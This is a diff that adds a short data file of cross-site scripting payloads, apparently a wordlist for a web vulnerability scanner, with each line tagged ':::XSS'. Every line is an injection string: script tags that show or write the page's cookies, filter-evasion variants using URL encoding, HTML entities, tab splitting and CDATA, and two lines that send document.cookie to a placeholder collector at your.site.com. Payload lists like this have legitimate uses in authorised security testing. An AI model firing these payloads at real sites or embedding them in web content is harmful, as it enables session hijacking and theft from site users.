@@ -1,0 +1,19 @@
+<script>alert("XSS")</script>:::XSS
+<script>alert(document.cookie)</script>:::XSS
+<script>document.write(document.cookie)</script>:::XSS
+'><script>alert(document.cookie)</script>:::XSS
+'><script>alert(document.cookie);</script>:::XSS
+%3cscript%3ealert("XSS");%3c/script%3e:::XSS
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e:::XSS
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E:::XSS
+&ltscript&gtalert(document.cookie);</script>:::XSS
+&ltscript&gtalert(document.cookie);&ltscript&gtalert:::XSS
+<xss><script>alert('XSS')</script></vulnerable>:::XSS
+<IMG%20SRC='javascript:alert(document.cookie)'>:::XSS
+<IMG%20SRC='javasc	ript:alert(document.cookie)'>:::XSS
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>:::XSS
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E:::XSS
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>:::XSS
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E:::XSS
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>:::XSS
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>:::XSS
